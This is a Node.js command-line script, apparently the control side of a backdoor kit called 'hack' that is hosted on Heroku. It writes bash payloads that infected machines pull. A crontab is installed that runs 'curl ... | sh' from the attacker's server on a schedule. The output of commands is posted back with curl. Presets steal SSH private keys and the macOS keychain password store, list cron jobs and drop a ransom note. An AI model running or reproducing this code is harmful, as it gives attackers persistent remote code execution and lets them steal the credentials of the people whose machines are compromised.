#! /usr/bin/env node
'use strict'

// use shelljs for compatability
const shell = require('shelljs')
// to escape strings so you can echo commands into files
const shellescape = require('shell-escape')
// parse out the arguments
const i = process.argv.indexOf('/usr/local/bin/hack')
// environment
const env = process.argv[i+1]
// command
const cmd = process.argv[i+2]
// additional arguments
const args = process.argv.slice(i+3)

// get package.json information
const npm = require('../package.json')
// the key used for injecting the root url
const url = npm.config.key

hack(env, cmd, args)

function hack(env, cmd, args) {

  // cd to hack/scripts/env/
  cdenv()

  if (env === 'help') {
    // `hack help`
    help()

  } else if (env === 'deploy') {
    // `hack deploy`
    shell.exec([
      'git add -A',
      'git commit -m "sinister hack"',
      'git push heroku master',
    ].join('; '))

  } else if (env === 'logs') {
    // `hack logs`
    shell.exec('heroku logs --tail --source app')

  } else if (cmd === 'exec') {
    // `hack live exec "say hello world"`
    write(env, args[0])

  } else if (cmd === 'dump') {
    // `hack live dump "cat ~/.ssh/id_rsa"`
    write(env, dump(args[0]))

  } else if (cmd == 'reset') {
    // `hack live reset`
     write(env, [
      'crontab -r',
      cronenv(env)
    ].join('\n'))

  } else if (cmd === 'interval') {
    // `hack live interval 1d`
    var freq

    if (args[0] === '1m') {
      freq = "* * * * *"
    } else if (args[0] === '1h') {
      freq = "0 * * * *"
    } else if (args[0] === '1d') {
      freq = "0 0 * * *"
    } else if (args[0] === '1M') {
      freq = "0 0 0 * *"
    } else if (args[0] === '1y') {
      freq = "0 0 0 0 *"
    } else if (args[0] === '1w') {
      freq = "0 0 * * 0"
    } else {
      throw new Error('Unknown interval', args[0])
    }

    write(env, [
      'crontab -r',
      cronenv(env, freq)
    ].join('\n'))

  } else if (cmd === 'cron') {
    // `hack live cron "20 16 * * * say 'its 4 20!'"`
    write(env, writecron(args[0]))

  } else if (cmd === 'forget') {
    // `hack live forget`
    write(env, "crontab -r")

  } else if (cmd === 'rename') {
    // `hack live rename jon`
    const newEnv = args[0]

    write(env, [
      "crontab -r",
      cronenv(newEnv)
    ].join('\n'))

    write(newEnv, '')

  } else if (cmd === 'preset') {
    const name = args[0]

    if (name === '420') {
      write(env, writecron("20 16 * * * * say 'its foe 20, ye better be toke-in'"))

    } else if (name === 'ssh') {
      write(env, dump("ls ~/.ssh/* | xargs cat"))

    } else if (name === 'cronjobs') {
      write(env, dump("crontab -l"))

    } else if (name === 'passwords') {
      write(env, dump("security dump -d"))

    } else if (name === 'ransom') {
      write(env, 'rm -f /tmp/ransom; ' + shellescape([
        'echo',
        args[1]
      ]) + ' > /tmp/ransom; open -a TextEdit /tmp/ransom')

    } else {
      throw new Error('Unknown preset', name)
    }

  } else {
    help()
  }
}

function write(env, cmd) {
  const id = Math.round(Math.random()*10000000000).toString()

  const text = [
    "#!/usr/bin/env bash",
    "",
    "if [[ ! -e /tmp/hack." + id + " ]]; then",
    cmd,
    "rm -f /tmp/hack/*",
    "touch /tmp/hack." + id,
    "fi",
  ].join('\n')

  cdenv()

  // make sure the environment file exists!
  if (!shell.test('-e', env)) {
    shell.touch(env)
  }

  // write to the environment file
  shell.exec(shellescape([
    'echo',
    text
  ]) + ' > ' + env)
}


function help() {
  console.log('hack v' + npm.version)
  console.log('usage: hack <env> <cmd> [args]')
}

function cdenv() {
  shell.cd(__dirname + '/../scripts/env')
}

function wrap(char, text) {
  // wrap text in a character and escape that character inside
  return char + text.replace(new RegExp(char, 'g'), '\\' + char) + char
}

function dump(cmd) {
  return 'echo ' + wrap('"', '$(' + cmd + ')') + ' | curl --data-binary @- ' + url + '/dump'
}

function cronenv(env, freq) {
  freq = freq || "* * * * *"
  return 'echo "' + freq + ' curl -s ' + url + '/env/' + env + ' | sh" | crontab'
}

function writecron(job) {
  return shellescape([
    "echo",
    job
  ]) + " | crontab"
}